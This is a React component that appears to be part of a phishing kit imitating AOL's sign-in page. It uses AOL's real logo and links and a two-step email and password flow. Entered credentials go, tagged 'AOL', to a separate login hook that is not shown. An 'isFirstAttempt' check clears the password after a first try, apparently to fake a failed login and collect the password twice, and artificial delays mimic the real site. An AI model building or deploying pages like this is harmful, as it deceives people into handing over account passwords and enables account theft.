import React, { useState, useEffect } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface AolLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  defaultEmail?: string;
}

// Simple input component for AOL style
const AolInput = ({ value, onChange, placeholder, type = "text", autoFocus = false }: any) => {
  const [isFocused, setIsFocused] = useState(false);

  return (
    <div className="relative mt-4">
      <input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setIsFocused(true)}
        onBlur={() => setIsFocused(false)}
        autoFocus={autoFocus}
        placeholder={placeholder}
        className="w-full bg-white pt-2 pb-2 text-base border-b focus:outline-none"
        style={{
          borderColor: isFocused ? '#0073e6' : '#dcdfe0',
          transition: 'border-color 0.2s'
        }}
      />
    </div>
  );
};

const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
  const [email, setEmail] = useState(defaultEmail || '');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);
  const [pageReady, setPageReady] = useState(false);
  const [nextLoading, setNextLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      setNextLoading(true);
      await new Promise(resolve => setTimeout(resolve, 800));
      setShowPasswordStep(true);
      setNextLoading(false);
    }
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setSubmitting(true);
    await new Promise(resolve => setTimeout(resolve, 1200));
    const result = await handleFormSubmit(
      { preventDefault: () => {} } as React.FormEvent,
      { email, password, provider: 'AOL' }
    );
    if (result?.isFirstAttempt) { setPassword(''); }
    setSubmitting(false);
  };

  const AolLogo = ({ className = '' }: { className?: string }) => (
    <img src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" alt="AOL" className={`select-none ${className}`} />
  );

  if (!pageReady) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <Spinner size="lg" color="border-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col" style={{ animation: 'fadeIn 0.3s ease-in' }}>
      <header className="flex-shrink-0 flex justify-between items-center py-4 px-6 md:px-10 border-b border-gray-200">
        <AolLogo className="h-6" />
        <div className="flex items-center space-x-4 text-xs text-gray-500 font-medium">
          <a href="https://help.aol.com/" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://legal.aol.com/us/en/aol/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          <a href="https://legal.aol.com/us/en/aol/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
        </div>
      </header>

      <main className="flex-grow w-full max-w-screen-xl mx-auto flex justify-end items-start px-4 md:px-10">
        <div 
          className="w-full max-w-[370px] mt-8 py-16 px-10 bg-white rounded-xl border border-gray-200"
        >
          <AolLogo className="h-10 mx-auto mb-6" />
          
          <h2 className="text-center text-2xl font-bold text-gray-900 mb-16">
            Sign in
          </h2>
          
          <form onSubmit={handleSubmit} className="space-y-5">
            {errorMessage && !isLoading && ( <p className="text-red-500 text-sm text-center -mb-2">{errorMessage}</p> )}

            {!showPasswordStep ? (
              <div>
                <AolInput value={email} onChange={(e: any) => setEmail(e.target.value)} placeholder="Username, email, or mobile" type="email" autoFocus />
                <button onClick={handleNext} disabled={!email || nextLoading} className="w-full mt-6 py-3 bg-[#0066FF] text-white font-bold rounded-md hover:bg-[#0052cc] disabled:bg-[#0066FF] disabled:cursor-not-allowed transition-colors text-base">
                  {nextLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Next'}
                </button>
              </div>
            ) : (
              <div>
                <div className="text-center text-sm font-medium p-2 rounded-md bg-gray-100 truncate">{email}</div>
                <AolInput value={password} onChange={(e: any) => setPassword(e.target.value)} placeholder="Password" type="password" autoFocus />
                <button type="submit" disabled={submitting || isLoading || !password} className="w-full mt-6 py-3 bg-[#0066FF] text-white font-bold rounded-md hover:bg-[#0052cc] disabled:opacity-50 transition-colors text-base">
                  {(submitting || isLoading) ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                </button>
              </div>
            )}

            <div className="text-sm flex justify-between items-center pt-4">
              <label className="flex items-center space-x-2 cursor-pointer">
                <input type="checkbox" className="form-checkbox h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
                <span className="text-[#0066FF] font-medium">Stay signed in</span>
              </label>
              <a href="https://login.aol.com/forgot" target="_blank" rel="noopener noreferrer" className="text-sm text-[#0066FF] hover:underline font-medium">Forgot username?</a>
            </div>

            <div className="relative text-center mt-4 mb-3">
              <span className="absolute inset-x-0 top-1/2 h-px bg-gray-200"></span>
              <span className="relative bg-white px-2 text-xs text-gray-500">or</span>
            </div>

            <div>
              <a href="https://login.aol.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-[#0066FF] text-[#0066FF] font-bold rounded-md hover:bg-blue-50 transition-colors text-base">Create an account</a>
            </div>

          </form>
        </div>
      </main>
    </div>
  );
};

export default AolLoginPage;
